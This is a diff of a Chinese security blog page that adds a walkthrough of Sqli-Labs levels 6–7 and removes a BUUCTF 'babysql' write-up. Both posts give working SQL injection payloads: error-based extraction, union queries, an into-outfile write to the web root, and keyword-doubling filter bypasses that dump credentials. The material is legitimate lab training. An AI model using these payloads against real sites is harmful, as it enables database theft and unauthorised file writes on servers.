@@ -277,6 +277,103 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-bc" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/02/22/bc/" class="article-date">
+      <time datetime="2021-02-22T05:11:15.000Z" itemprop="datePublished">2021-02-22</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/02/22/bc/">Sqli-Labs靶场6-7</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1>知识点</h1>
+<h3>outfile语句</h3>
+
+<p>这里需要注意的是outfile语句在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。<br>（1）secure_file_priv<br>这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；如果这个参数为空，那么导入导出的文件位置将不受限制。<br>该参数的设置，可以在my.cnf配置文件中修改，而在搭建的SQLi-Labs环境中下需要在配置的phpstudy环境中修改，具体修改方法因配置环境而异，此处不作讲解。<br>（2）datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径<br>（3）PrivateTmp<br>使用Systemd进程作为启动进程的linux系统，其子进程都会有一个属性叫PrivateTmp，用于设置是否使用私有的tmp目录。</p>
+<h1>Less-6</h1>
+<h3>界面</h3>
+
+<p><img src="/2021/02/22/bc/b1.png"></p>
+<h3>测试</h3>
+
+<p>通过测试可知：?id=1”<br><img src="/2021/02/22/bc/b2.png"></p>
+<ul>
+<li>url + ?id=1" order by 4--+ //报错
+</li></ul>
+
+<p><img src="/2021/02/22/bc/b3.png"><br>可知字段数为3，页面有布尔类型状态，所以用布尔盲注，页面没有回显不能用联合查询，页面没有报错信息不能用报错注入。<br>其余步骤和第五关的一模一样，只是将单引号变为双引号<br>最终payload：?id=1” and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))–+<br>得到所有数据：<br><img src="/2021/02/22/bc/b4.png"></p>
+<h1>Less-7</h1>
+<h3>界面</h3>
+
+<p><img src="/2021/02/22/bc/c1.png"></p>
+<h3>测试</h3>
+
+<p>首先，按照提示输入id参数，尝试寻找注入点<br>构建url: …/Less-7/?id=1<br><img src="/2021/02/22/bc/c2.png"><br>页面显示正常，提示使用outfile语句<br>构建url：…/Less-7/?id=1’<br><img src="/2021/02/22/bc/c3.png"><br>页面报错，但是没有提示报错信息,网站存在注入点,通过不断尝试，我们猜测到了原有sql语句的闭合方式<br>构建url：…/Less-7/?id=1’)) –+<br>页面显示正常<br>那么可以使用union联合查询构造语句：</p>
+<ul>
+<li>../Less-7/?id=1")) union select 1,2,3 --(( "
+</li></ul>
+
+<p>此时的查询语句；select * from users where id=((‘1’)) union select 1,2,3 –(( ‘)<br>在linux中，网站一般是放在/var/www/html目录里，这里我们dump一个文件到这个目录，名字是hacker.txt。<br>构造语句：</p>
+<ul>
+<li>../Less-7/?id=1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
+</li></ul>
+
+<p><img src="/2021/02/22/bc/c4.png"><br>虽然报错，但是文件已经生成</p>
+<p>打开链接：</p>
+<p>…/hacker.txt即可找到</p>
+<p>此时的sql语句为：</p>
+<ul>
+<li>select * from users where id=(('1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
+</li></ul>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-hack" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1154,64 +1251,6 @@ highlight_file(__FILE__);
 </li></ul>
 
 <p><img src="/2021/02/01/bachang/q5.png"><br>啊~好累的一天<br><img src="/2021/02/01/bachang/bbb.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-baby" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/01/31/baby/" class="article-date">
-      <time datetime="2021-01-31T07:30:50.000Z" itemprop="datePublished">2021-01-31</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/01/31/baby/">17-Buu练习baby Sql</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>打开靶机：<br><img src="/2021/01/31/baby/baby1.png"><br>emmmm应该是lovesql惹的祸吧，euuu网站被日原谅我不厚道地笑了，应该是个加强版的注入！<br>先输入用户名和密码，看看什么反应。<br><img src="/2021/01/31/baby/baby2.png"><br>额…整一手万能密码：闭合双引号:<br>?username=admin&amp;password=admin’ or ‘1’=’1<br><img src="/2021/01/31/baby/baby3.png"><br>euuuuu报错了，说密码错误，那重新重新构造pyload：<br>?username=admin’&amp;password=admin or ‘1’=’1<br>看看是否报错<br><img src="/2021/01/31/baby/baby4.png"><br>emmmm我们的or去哪里啦？于是进一步测试，发现过滤了好多关键字，比如or, select,where, union。应该是用函数replace给我们替换成了空白字符<br>知道了这样，我们就进行绕过，于是拼接字符，无法用order by 1来判断字段个数，我们只有使用联合查询看他是否能查出来，应该列数不太多，于是我们构造<br>pyload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2%23<br><img src="/2021/01/31/baby/baby5.png"><br>eeee应该是列数不对，再次构造payload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,3%23<br><img src="/2021/01/31/baby/baby6.png"><br>啊哈~对啦<br>可以看出有两个显示位：2和3<br>先查3的表：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()%23<br><img src="/2021/01/31/baby/baby7.png"><br>查出来两张表b4bsql和geekuser<br>爆表b4bsql字段：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name=’b4bsql’%23<br><img src="/2021/01/31/baby/baby8.png"><br>查出三个列字段：id,username,password<br>最后查数据，当然是查密码了，flag就在里面，别问我为什么，问就是直觉！<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql%23<br><img src="/2021/01/31/baby/baby9.png"><br>成功得到flag！<br><img src="/2021/01/31/baby/baby10.gif"></p>
 
       
     </div>
